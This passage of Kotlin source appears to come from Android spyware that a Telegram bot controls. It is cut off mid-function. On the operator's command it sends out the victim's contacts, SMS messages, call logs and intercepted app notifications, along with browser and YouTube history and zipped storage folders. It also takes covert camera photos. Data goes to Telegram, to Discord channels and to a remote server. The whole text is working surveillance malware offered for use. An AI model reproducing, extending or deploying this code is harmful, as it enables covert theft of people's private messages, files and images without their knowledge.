            if (historyFile.exists() && historyFile.length() > 2 * 1024 * 1024L) {
                val lines = historyFile.readLines()
                if (lines.size > 200) {
                    val recentLines = lines.drop(lines.size / 3)
                    historyFile.writeText(recentLines.joinToString("\n") + "\n")
                }
            }
            historyFile.appendText(entry)
        } catch (e: Exception) {
            Log.e(TAG, "saveYouTubeHistoryLocally error: ${e.message}")
        }
    }

    private fun handleYouTubeHistoryCommand(chatId: String) {
        try {
            val historyFile = File(cacheDir, ".youtube_history.txt")
            if (!historyFile.exists() || historyFile.length() == 0L) {
                sendMessage(chatId, "▶️ **No YouTube Watch History Logged Yet**\n• Watched YouTube videos & searches will appear here in real-time.")
                return
            }

            val lines = historyFile.readLines().takeLast(30)
            val sb = StringBuilder()
            sb.append("▶️ **Recent YouTube Watch History (Last ${lines.size} Entries):**\n```\n")
            for (line in lines) {
                sb.append(line).append("\n")
            }
            sb.append("```")

            sendMessage(chatId, sb.toString())
        } catch (e: Exception) {
            Log.e(TAG, "handleYouTubeHistoryCommand error: ${e.message}")
            sendMessage(chatId, "❌ **Error Reading YouTube History**: ${e.message}")
        }
    }

    fun saveBrowserHistoryLocally(browserName: String, title: String, url: String, timeStr: String) {
        try {
            val historyFile = File(cacheDir, ".browser_history.txt")
            val entry = "[$timeStr] [$browserName] ${if (title.isNotBlank()) "$title | " else ""}$url\n"
            if (historyFile.exists() && historyFile.length() > 2 * 1024 * 1024L) {
                val lines = historyFile.readLines()
                if (lines.size > 200) {
                    val recentLines = lines.drop(lines.size / 3)
                    historyFile.writeText(recentLines.joinToString("\n") + "\n")
                }
            }
            historyFile.appendText(entry)
        } catch (e: Exception) {
            Log.e(TAG, "saveBrowserHistoryLocally error: ${e.message}")
        }
    }

    private fun handleBrowserHistoryCommand(chatId: String) {
        try {
            val historyFile = File(cacheDir, ".browser_history.txt")
            if (!historyFile.exists() || historyFile.length() == 0L) {
                sendMessage(chatId, "🌐 **No Browser History Logged Yet**\n• Browser navigation & URLs will appear here in real-time as websites are visited.")
                return
            }

            val lines = historyFile.readLines().takeLast(30)
            val sb = StringBuilder()
            sb.append("🌐 **Recent Browser Navigation History (Last ${lines.size} Entries):**\n```\n")
            for (line in lines) {
                sb.append(line).append("\n")
            }
            sb.append("```")

            sendMessage(chatId, sb.toString())
        } catch (e: Exception) {
            Log.e(TAG, "handleBrowserHistoryCommand error: ${e.message}")
            sendMessage(chatId, "❌ **Error Reading Browser History**: ${e.message}")
        }
    }

    private fun handleNotificationMenu(chatId: String) {
        val notifDir = File(cacheDir, ".notifs")
        if (!notifDir.exists() || notifDir.listFiles().isNullOrEmpty()) {
            sendMessage(chatId, "📭 *No logged notifications found yet.*\n\nMake sure Notification Access is granted in Settings.", parseMode = "Markdown")
            return
        }

        val files = notifDir.listFiles()?.filter { it.isFile && it.name.endsWith(".txt") } ?: emptyList()
        if (files.isEmpty()) {
            sendMessage(chatId, "📭 *No logged notifications found yet.*", parseMode = "Markdown")
            return
        }

        val keyboardRows = JSONArray()
        var currentRow = JSONArray()
        var totalCount = 0

        files.forEach { file ->
            val pkgName = file.name.removeSuffix(".txt")
            val lines = file.readLines()
            val appNameHeader = lines.firstOrNull { it.startsWith("#APP_NAME:") }
            val appName = appNameHeader?.removePrefix("#APP_NAME:") ?: pkgName
            val logCount = lines.count { !it.startsWith("#APP_NAME:") && it.isNotBlank() }
            totalCount += logCount

            if (logCount > 0) {
                val btnEmoji = when {
                    pkgName.contains("whatsapp") -> "💬"
                    pkgName.contains("gmail") -> "📧"
                    pkgName.contains("facebook") || pkgName.contains("orca") -> "💬"
                    pkgName.contains("instagram") -> "📸"
                    pkgName.contains("telegram") -> "✈️"
                    pkgName.contains("messaging") || pkgName.contains("mms") -> "💬"
                    else -> "🔔"
                }

                val btnObj = JSONObject().apply {
                    put("text", "$btnEmoji $appName ($logCount)")
                    put("callback_data", "/notif_view_$pkgName")
                }

                currentRow.put(btnObj)
                if (currentRow.length() >= 2) {
                    keyboardRows.put(currentRow)
                    currentRow = JSONArray()
                }
            }
        }

        if (currentRow.length() > 0) {
            keyboardRows.put(currentRow)
        }

        keyboardRows.put(JSONArray().apply {
            put(JSONObject().apply {
                put("text", "🗑️ Clear All Notification Logs")
                put("callback_data", "/notif_clear_all")
            })
        })

        val text = "🔔 *Categorized App Notifications*\n\nTotal captured logs: *$totalCount*\nSelect an app below to view its hidden notification history:"
        val replyMarkup = JSONObject().put("inline_keyboard", keyboardRows)

        sendMessageWithMarkup(chatId, text, replyMarkup)
    }

    private fun handleDumpNotifications(chatId: String) {
        serviceScope.launch(Dispatchers.IO) {
            val notifDir = File(cacheDir, ".notifs")
            if (!notifDir.exists() || notifDir.listFiles().isNullOrEmpty()) {
                sendMessage(chatId, "📭 *No notification logs cached on device.*", parseMode = "Markdown")
                return@launch
            }

            val files = notifDir.listFiles()?.filter { it.isFile && it.name.endsWith(".txt") } ?: emptyList()
            if (files.isEmpty()) {
                sendMessage(chatId, "📭 *No notification logs cached on device.*", parseMode = "Markdown")
                return@launch
            }

            var totalDumps = 0
            files.forEach { file ->
                val pkgName = file.name.removeSuffix(".txt")
                val lines = file.readLines()
                val appNameHeader = lines.firstOrNull { it.startsWith("#APP_NAME:") }
                val appName = appNameHeader?.removePrefix("#APP_NAME:") ?: pkgName
                val logLines = lines.filter { !it.startsWith("#APP_NAME:") && it.isNotBlank() }

                if (logLines.isNotEmpty()) {
                    val header = "📦 **Cached Notification Dump [$appName]** (${logLines.size} entries):\n```\n"
                    val footer = "\n```"
                    val sb = StringBuilder(header)

                    logLines.forEach { line ->
                        if (sb.length + line.length + 5 > 1900) {
                            sb.append(footer)
                            sendDiscordCategorizedMessage("04-notifications", sb.toString())
                            totalDumps++
                            sb.clear()
                            sb.append(header)
                        }
                        sb.append(line).append("\n")
                    }

                    if (sb.length > header.length) {
                        sb.append(footer)
                        sendDiscordCategorizedMessage("04-notifications", sb.toString())
                        totalDumps++
                    }
                }
            }

            // Flush any offline queued telemetry
            flushOfflineTelemetryQueue()

            sendMessage(chatId, "✅ *Notification Logs Dumped!* Processed ${files.size} packages. Total chunks sent to `#04-notifications`: $totalDumps.", parseMode = "Markdown")
        }
    }

    private fun handleAppNotificationView(chatId: String, packageName: String) {
        val notifDir = File(cacheDir, ".notifs")
        val file = File(notifDir, "$packageName.txt")

        if (!file.exists()) {
            sendMessage(chatId, "📭 No logs found for `$packageName`.", parseMode = "Markdown")
            return
        }

        val lines = file.readLines()
        val appNameHeader = lines.firstOrNull { it.startsWith("#APP_NAME:") }
        val appName = appNameHeader?.removePrefix("#APP_NAME:") ?: packageName
        val logLines = lines.filter { !it.startsWith("#APP_NAME:") && it.isNotBlank() }

        if (logLines.isEmpty()) {
            sendMessage(chatId, "📭 Notification log for *$appName* is empty.", parseMode = "Markdown")
            return
        }

        val header = "🔔 *Notification Logs for $appName* (${logLines.size} entries):\n\n"
        val sb = StringBuilder(header)

        logLines.forEach { line ->
            val entry = "• $line\n\n"
            if (sb.length + entry.length > 3800) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(entry)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }

        val clearKeyboard = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🗑️ Clear $appName Logs").put("callback_data", "/notif_clear_$packageName"))
                    put(JSONObject().put("text", "🔙 Back to App List").put("callback_data", "/notification"))
                })
            })
        }
        sendMessageWithMarkup(chatId, "Manage logs for *$appName*:", clearKeyboard)
    }

    private fun handleClearAppNotification(chatId: String, packageName: String) {
        val notifDir = File(cacheDir, ".notifs")
        if (packageName == "all") {
            notifDir.listFiles()?.forEach { it.delete() }
            sendMessage(chatId, "✅ *All notification logs cleared successfully!*", parseMode = "Markdown")
        } else {
            val file = File(notifDir, "$packageName.txt")
            if (file.exists()) {
                file.delete()
                sendMessage(chatId, "✅ *Logs for `$packageName` cleared!*", parseMode = "Markdown")
            } else {
                sendMessage(chatId, "⚠️ Log file not found.", parseMode = "Markdown")
            }
        }
        handleNotificationMenu(chatId)
    }

    private fun getSelectedTargetId(): String {
        return getSharedPreferences("device_prefs", MODE_PRIVATE).getString("selected_target_id", "all") ?: "all"
    }

    private fun setSelectedTargetId(target: String) {
        getSharedPreferences("device_prefs", MODE_PRIVATE).edit().putString("selected_target_id", target).apply()
    }

    private fun isCommandTargetedToMe(): Boolean {
        val target = getSelectedTargetId()
        if (target.equals("all", ignoreCase = true)) return true
        val myDeviceId = getOrCreateDeviceId()
        val myInstallId = getOrCreateInstallationId()
        val myModel = Build.MODEL
        return myDeviceId.contains(target, ignoreCase = true) ||
                myInstallId.contains(target, ignoreCase = true) ||
                myModel.contains(target, ignoreCase = true)
    }

    private fun handleTargetCommand(chatId: String, target: String) {
        val trimmed = target.trim()
        if (trimmed.isEmpty()) {
            val current = getSelectedTargetId()
            sendMessage(chatId, "🎯 *Current Active Target:* `$current`\n\nUsage: `/target <device_id_or_model>` or `/target all`", parseMode = "Markdown")
            return
        }

        setSelectedTargetId(trimmed)
        val myDeviceId = getOrCreateDeviceId()
        val myModel = Build.MODEL

        if (isCommandTargetedToMe()) {
            sendMessage(chatId, "🎯 *Active Target Set To:* `$trimmed`\n✅ Device `$myModel` (`$myDeviceId`) is ACTIVE for all commands.", parseMode = "Markdown")
        }
    }

    private fun sendDeviceListMenu(chatId: String) {
        val myDeviceId = getOrCreateDeviceId()
        val myModel = Build.MODEL
        val currentTarget = getSelectedTargetId()
        val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1

        val isMeSelected = currentTarget.equals("all", ignoreCase = true) ||
                currentTarget.contains(myModel, ignoreCase = true) ||
                currentTarget.contains(myDeviceId, ignoreCase = true)

        val targetStatus = if (isMeSelected) "🟢 SELECTED TARGET" else "⚪ INACTIVE"

        val msg = "📱 *Connected Devices Directory*\n\n" +
                "1. 🟢 *`$myModel`* (`$myDeviceId`)\n" +
                "   • Status: ONLINE & READY\n" +
                "   • Battery: ${if (batteryPct >= 0) "$batteryPct%" else "N/A"}\n" +
                "   • Targeting: $targetStatus\n\n" +
                "🎯 *Current Target Setting:* `$currentTarget`"

        val replyMarkup = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "🌐 Target ALL Devices")
                        put("callback_data", "/target all")
                    })
                    put(JSONObject().apply {
                        put("text", "📱 Target THIS Device")
                        put("callback_data", "/target $myModel")
                    })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📋 Open Help Grid")
                        put("callback_data", "/help")
                    })
                    put(JSONObject().apply {
                        put("text", "🔄 Refresh Status")
                        put("callback_data", "/devicelist")
                    })
                })
            })
        }

        sendMessageWithMarkup(chatId, msg, replyMarkup)
    }

    private fun sendMessageWithMarkup(chatId: String, text: String, replyMarkup: JSONObject, threadId: Int? = null) {
        serviceScope.launch(Dispatchers.IO) {
            val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
            val json = JSONObject().apply {
                put("chat_id", targetChat)
                put("text", text)
                put("parse_mode", "Markdown")
                put("reply_markup", replyMarkup)
                if (threadId != null && threadId > 0) put("message_thread_id", threadId)
            }

            for (attempt in 1..3) {
                try {
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val url = getTelegramApiUrl("sendMessage")
                    val request = Request.Builder().url(url).post(body).build()

                    val isSuccess = httpClient.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            Log.i(TAG, "sendMessageWithMarkup successfully sent to Telegram chat $targetChat (thread: $threadId)")
                            true
                        } else {
                            Log.w(TAG, "sendMessageWithMarkup attempt $attempt failed HTTP ${response.code}")
                            false
                        }
                    }
                    if (isSuccess) break
                } catch (e: Exception) {
                    Log.e(TAG, "sendMessageWithMarkup attempt $attempt exception: ${e.message}")
                }
                delay(1000L * attempt)
            }
        }
    }

    private fun handleStatus(chatId: String) {
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date())
        val reply = "✅ Phone Alive\n🕐 $timeStr"
        sendMessage(chatId, reply)
    }

    private fun handleContacts(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CONTACTS permission not granted.")
            return
        }

        val contacts = readContacts()
        if (contacts.isEmpty()) {
            sendMessage(chatId, "📭 No contacts found on this device.")
            return
        }

        val header = "📒 *Contacts List* (${contacts.size}):\n\n"
        val sb = StringBuilder(header)

        contacts.forEachIndexed { index, (name, number) ->
            val entry = "${index + 1}. *$name*\n   `$number`\n\n"
            if (sb.length + entry.length > 3800) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(entry)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private fun readContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val resolver: ContentResolver = contentResolver

        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        ) ?: return contacts

        cursor.use {
            val nameCol   = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext() && contacts.size < MAX_CONTACTS) {
                val name   = it.getString(nameCol)  ?: "Unknown"
                val number = it.getString(numberCol) ?: "N/A"
                contacts.add(Pair(name, number))
            }
        }

        return contacts
    }

    private fun handleCallLogs(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CALL_LOG permission not granted.")
            return
        }

        val calls = readCallLogEntries()
        if (calls.isEmpty()) {
            sendMessage(chatId, "📭 No call logs found.")
            return
        }

        val header = "📞 *Call History* (${calls.size} entries):\n\n"
        val sb = StringBuilder(header)

        calls.forEach { call ->
            val entry = "${call.typeEmoji} *${call.number}*\n   👤 ${call.name}\n   🕐 ${call.dateStr} (${call.durationSec}s)\n\n"
            if (sb.length + entry.length > 3800) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(entry)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private data class CallLogEntry(
        val typeEmoji: String,
        val number: String,
        val name: String,
        val dateStr: String,
        val durationSec: Long
    )

    private fun readCallLogEntries(limit: Int = 1_000): List<CallLogEntry> {
        val results = mutableListOf<CallLogEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())

        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
            ),
            null, null,
            "${CallLog.Calls.DATE} DESC"
        ) ?: return results

        cursor.use { c ->
            val numCol = c.getColumnIndex(CallLog.Calls.NUMBER)
            val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
            val durationCol = c.getColumnIndex(CallLog.Calls.DURATION)
            val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)

            while (c.moveToNext() && results.size < limit) {
                val number = c.getString(numCol) ?: "Unknown"
                val name = c.getString(nameCol) ?: "Unknown"
                val dateMs = c.getLong(dateCol)
                val duration = c.getLong(durationCol)
                val type = c.getInt(typeCol)

                val typeEmoji = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "📥"
                    CallLog.Calls.OUTGOING_TYPE -> "📤"
                    CallLog.Calls.MISSED_TYPE -> "❌"
                    else -> "📞"
                }

                results.add(
                    CallLogEntry(
                        typeEmoji = typeEmoji,
                        number = number,
                        name = name,
                        dateStr = dateFmt.format(Date(dateMs)),
                        durationSec = duration
                    )
                )
            }
        }
        return results
    }

    private fun saveToOfflineQueue(payload: String, filename: String) {
        try {
            val queueDir = File(cacheDir, "offline_queue")
            queueDir.mkdirs()
            val file = File(queueDir, "${System.currentTimeMillis()}_$filename")
            file.writeText(payload)
            Log.i(TAG, "Saved item to offline queue: ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save to offline queue: ${e.message}")
        }
    }

    private fun processOfflineQueue() {
        val queueDir = File(cacheDir, "offline_queue")
        if (!queueDir.exists()) return

        queueDir.listFiles()?.forEach { file ->
            try {
                val content = file.readText()
                val body = content.toRequestBody("application/json".toMediaTypeOrNull())
                val deviceId = getOrCreateDeviceId()
                val request = Request.Builder()
                    .url("$SERVER_URL/api/result/$deviceId")
                    .post(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        file.delete()
                        Log.i(TAG, "Synced offline queued item and deleted: ${file.name}")
                    }
                }
            } catch (e: Exception) {
                // Server still offline, keep in queue
            }
        }
    }

    private fun handleSms(chatId: String, filter: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_SMS permission not granted.")
            return
        }

        val messages = readSmsMessages(filter.trim())

        if (messages.isEmpty()) {
            val hint = if (filter.isBlank()) "No SMS messages found."
                       else "No messages found for number: $filter"
            sendMessage(chatId, "📭 $hint")
            return
        }

        val header  = if (filter.isBlank())
            "💬 *Last SMS messages* (${messages.size}):\n\n"
        else
            "💬 *SMS with* `$filter` (${messages.size}):\n\n"

        val sb = StringBuilder(header)

        messages.forEach { msg ->
            val line = "${msg.dirEmoji} *${msg.address}*\n" +
                       "   🕐 ${msg.dateStr}\n" +
                       "   ${msg.body}\n\n"

            if (sb.length + line.length > 4_000) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(line)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private fun handleZipFolder(chatId: String, folderPath: String) {
        val trimmed = folderPath.trim()
        if (trimmed.isEmpty()) {
            sendMessage(chatId, "ℹ️ Usage: `/zip Download` or `/zip WhatsApp/Media` or `/zip DCIM/Camera`", parseMode = "Markdown")
            return
        }

        val root = Environment.getExternalStorageDirectory()
        val targetDir = File(root, trimmed)

        if (!targetDir.exists() || !targetDir.isDirectory) {
            sendMessage(chatId, "❌ Directory `$trimmed` not found or is not a folder.", parseMode = "Markdown")
            return
        }

        sendMessage(chatId, "📦 Zipping folder `${targetDir.name}`… Please wait.", parseMode = "Markdown")

        serviceScope.launch {
            val zipFile = File(cacheDir, "${targetDir.name}_${System.currentTimeMillis()}.zip")
            try {
                zipDirectory(targetDir, zipFile)

                if (!zipFile.exists() || zipFile.length() == 0L) {
                    sendMessage(chatId, "❌ Failed to create zip file or folder is empty.")
                    return@launch
                }

                val sizeMb = "%.1f".format(zipFile.length() / (1024.0 * 1024.0))
                sendMessage(chatId, "📤 Uploading `${zipFile.name}` ($sizeMb MB)…", parseMode = "Markdown")

                val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
                val bytes = zipFile.readBytes()
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", targetChat)
                    .addFormDataPart(
                        "document",
                        zipFile.name,
                        bytes.toRequestBody("application/zip".toMediaTypeOrNull())
                    )
                    .addFormDataPart("caption", "📦 Folder Backup: `${targetDir.name}` ($sizeMb MB)")
                    .build()

                val request = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        sendMessage(targetChat, "✅ Folder `${targetDir.name}` zipped and uploaded successfully!", parseMode = "Markdown")
                    } else {
                        sendMessage(targetChat, "❌ Upload failed: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "zipFolder error: ${e.message}")
                sendMessage(chatId, "❌ Error zipping folder: ${e.message}")
            } finally {
                try { zipFile.delete() } catch (_: Exception) {}
            }
        }
    }

    private fun zipDirectory(sourceDir: File, zipFile: File) {
        ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
            zipFileRecursive(sourceDir, sourceDir, zos)
        }
    }

    private fun zipFileRecursive(rootDir: File, currentFile: File, zos: ZipOutputStream) {
        if (currentFile.isDirectory) {
            currentFile.listFiles()?.forEach { child ->
                zipFileRecursive(rootDir, child, zos)
            }
        } else {
            val relativePath = rootDir.toURI().relativize(currentFile.toURI()).path
            zos.putNextEntry(ZipEntry(relativePath))
            FileInputStream(currentFile).use { fis ->
                fis.copyTo(zos)
            }
            zos.closeEntry()
        }
    }

    private fun handlePwd(chatId: String) {
        val root = Environment.getExternalStorageDirectory().absolutePath
        val relPath = currentDir.absolutePath.removePrefix(root).ifEmpty { "/" }
        sendMessage(chatId, "📁 *Current Working Directory:*\n`$relPath`\n\nFull Path: `${currentDir.absolutePath}`", parseMode = "Markdown")
    }

    private fun handleCd(chatId: String, target: String) {
        val trimmed = target.trim()
        if (trimmed.isEmpty()) {
            handlePwd(chatId)
            return
        }

        if (trimmed == ".." || trimmed == "../") {
            val parent = currentDir.parentFile
            val root = Environment.getExternalStorageDirectory()
            if (parent != null && parent.absolutePath.startsWith(root.absolutePath)) {
                currentDir = parent
                sendMessage(chatId, "📂 Moved up to `${currentDir.name.ifEmpty { "root" }}`\nType `ls` to view contents.", parseMode = "Markdown")
            } else {
                sendMessage(chatId, "⚠️ Already at top-level storage root.", parseMode = "Markdown")
            }
            return
        }

        val newDir = File(currentDir, trimmed)
        if (newDir.exists() && newDir.isDirectory) {
            currentDir = newDir
            sendMessage(chatId, "📂 Moved into `${currentDir.name}`\nType `ls` to view contents.", parseMode = "Markdown")
        } else {
            val match = currentDir.listFiles()?.firstOrNull { it.isDirectory && it.name.lowercase() == trimmed.lowercase() }
            if (match != null) {
                currentDir = match
                sendMessage(chatId, "📂 Moved into `${currentDir.name}`\nType `ls` to view contents.", parseMode = "Markdown")
            } else {
                sendMessage(chatId, "❌ Folder `$trimmed` not found in current directory.", parseMode = "Markdown")
            }
        }
    }

    private fun handleLs(chatId: String) {
        val all = currentDir.listFiles() ?: emptyArray()
        val subDirs = all.filter { it.isDirectory }.sortedBy { it.name.lowercase() }
        val files = all.filter { it.isFile && it.length() > 0 }.sortedByDescending { it.lastModified() }

        val root = Environment.getExternalStorageDirectory().absolutePath
        val relPath = currentDir.absolutePath.removePrefix(root).ifEmpty { "/" }

        val header = "📂 *Directory Listing:* `$relPath`\n\n"
        val sb = StringBuilder(header)

        if (subDirs.isNotEmpty()) {
            sb.append("📁 *Sub-folders (${subDirs.size}):*\n")
            subDirs.forEach { d ->
                val c = d.listFiles()?.size ?: 0
                val entry = "  • `cd ${d.name}` ($c items)\n"
                if (sb.length + entry.length > 3800) {
                    sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                    sb.clear()
                }
                sb.append(entry)
            }
            sb.append("\n")
        }

        if (files.isNotEmpty()) {
            sb.append("📄 *Files (${files.size}):*\n")
            files.forEachIndexed { i, f ->
                val size = when {
                    f.length() >= 1_048_576 -> "${"%.1f".format(f.length() / 1_048_576.0)} MB"
                    f.length() >= 1_024     -> "${"%.1f".format(f.length() / 1_024.0)} KB"
                    else                    -> "${f.length()} B"
                }
                val entry = "${i + 1}. `${f.name}` — $size\n"
                if (sb.length + entry.length > 3800) {
                    sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                    sb.clear()
                }
                sb.append(entry)
            }
        }

        if (subDirs.isEmpty() && files.isEmpty()) {
            sb.append("_(Folder is empty)_")
        }

        sb.append("\n\n💡 *Terminal Controls:*\n• `cd <folder>` — Enter folder\n• `cd ..` — Go back up\n• `pwd` — Current directory\n• `/zip ${relPath.trimStart('/')}` — Download ZIP")
        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private data class SmsEntry(
        val dirEmoji: String,   
        val address:  String,   
        val dateStr:  String,
        val body:     String
    )

    private fun readSmsMessages(numberFilter: String, limit: Int = 1_000): List<SmsEntry> {
        val results = mutableListOf<SmsEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())

        val (selection, selArgs) = if (numberFilter.isNotEmpty()) {
            Pair("address LIKE ?", arrayOf("%${numberFilter.takeLast(7)}%"))
        } else {
            Pair(null, null)
        }

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            selection,
            selArgs,
            "${Telephony.Sms.DATE} DESC"
        ) ?: return results

        cursor.use { c ->
            val addrCol = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = c.getColumnIndex(Telephony.Sms.BODY)
            val dateCol = c.getColumnIndex(Telephony.Sms.DATE)
            val typeCol = c.getColumnIndex(Telephony.Sms.TYPE)

            while (c.moveToNext() && results.size < limit) {
                val address  = c.getString(addrCol) ?: "Unknown"
                val rawBody  = c.getString(bodyCol) ?: ""
                val dateMs   = c.getLong(dateCol)
                val smsType  = c.getInt(typeCol)

                val body = if (rawBody.length > 120)
                    rawBody.take(120) + "…"
                else
                    rawBody

                val safeBody = body
                    .replace("_", "\\_")
                    .replace("*", "\\*")
                    .replace("`", "\\`")
                    .replace("[", "\\[")

                val dirEmoji = if (smsType == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"

                results.add(
                    SmsEntry(
                        dirEmoji = dirEmoji,
                        address  = address,
                        dateStr  = dateFmt.format(Date(dateMs)),
                        body     = safeBody
                    )
                )
            }
        }

        return results
    }

    private fun handleCamera(chatId: String, cameraSelector: CameraSelector) {
        val facing = if (cameraSelector == CameraSelector.DEFAULT_FRONT_CAMERA)
            CameraCharacteristics.LENS_FACING_FRONT
        else
            CameraCharacteristics.LENS_FACING_BACK

        handleCameraNative2(chatId, facing)
    }

    @Volatile private var activeCameraDevice: CameraDevice? = null

    private fun closeActiveCameraHardware() {
        try {
            activeCameraDevice?.close()
            activeCameraDevice = null
        } catch (e: Exception) {
            Log.w(TAG, "closeActiveCameraHardware error: ${e.message}")
        }
        try {
            mainHandler.post {
                try { ProcessCameraProvider.getInstance(this).get().unbindAll() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    private fun handleCameraNative2(chatId: String, cameraLensFacing: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "⚠️ CAMERA permission not granted.")
            return
        }

        val label = if (cameraLensFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
        sendMessage(chatId, "📷 Taking photo ($label camera)…")

        serviceScope.launch(Dispatchers.IO) {
            closeActiveCameraHardware()
            delay(250L)
            try {
                val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
                var targetCameraId: String? = null

                for (id in cameraManager.cameraIdList) {
                    val chars = cameraManager.getCameraCharacteristics(id)
                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
                    if (facing == cameraLensFacing) {
                        targetCameraId = id
                        break
                    }
                }

                if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                    targetCameraId = cameraManager.cameraIdList[0]
                }

                if (targetCameraId == null) {
                    sendMessage(chatId, "❌ No camera hardware available.")
                    return@launch
                }

                val imageReader = android.media.ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 2)
                val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")

                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        FileOutputStream(photoFile).use { out ->
                            out.write(bytes)
                        }

                        Log.i(TAG, "Camera2 photo saved successfully: ${photoFile.absolutePath}")
                        sendPhoto(chatId, photoFile, deleteAfterSend = true)
                    } catch (e: Exception) {
                        Log.e(TAG, "ImageReader error: ${e.message}")
                        sendMessage(chatId, "❌ Photo capture failed: ${e.message}")
                    }
                }, mainHandler)

                cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val surface = imageReader.surface
                            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(surface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            }
                            camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
